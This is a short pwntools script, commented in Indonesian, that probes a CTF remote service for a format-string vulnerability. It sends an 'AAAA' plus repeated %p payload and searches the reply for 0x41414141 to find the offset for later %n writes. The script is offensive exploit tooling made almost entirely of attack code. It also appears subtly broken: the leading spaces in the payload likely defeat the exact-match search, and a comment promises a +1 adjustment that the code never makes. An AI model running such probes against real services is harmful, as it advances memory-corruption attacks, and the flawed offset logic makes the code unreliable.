from pwn import *

# === 1. KONFIGURASI ===
# io = process('./vuln')              # Lokal
io = remote('target-ctf.id', 1234)    # NC / Remote

# === 2. NYARI OFFSET (AAAA Trick) ===
# Kita kirim "AAAA" (0x41414141) diikuti banyak %p
payload = b"AAAA." + b" %p." * 20 

io.sendline(payload)

# Terima output dari program
output = io.recvline() 

# Cari di mana 0x41414141 muncul di output
try:
    # Split output berdasarkan titik, lalu cari index 0x41414141
    res = output.split(b'.')
    # Ditambah 1 karena index list mulai dari 0, sedangkan offset format string mulai dari 1
    offset = res.index(b'0x41414141')
    
    print(f"\n[+] KETEMU! Offset buffer lu adalah: {offset}")
    print(f"[+] Jadi ntar pakenya: %{offset}$n atau %{offset}$p\n")

except ValueError:
    print("\n[!] Yah, nggak ketemu 0x41414141. Coba naikin jumlah %p nya.")

io.close()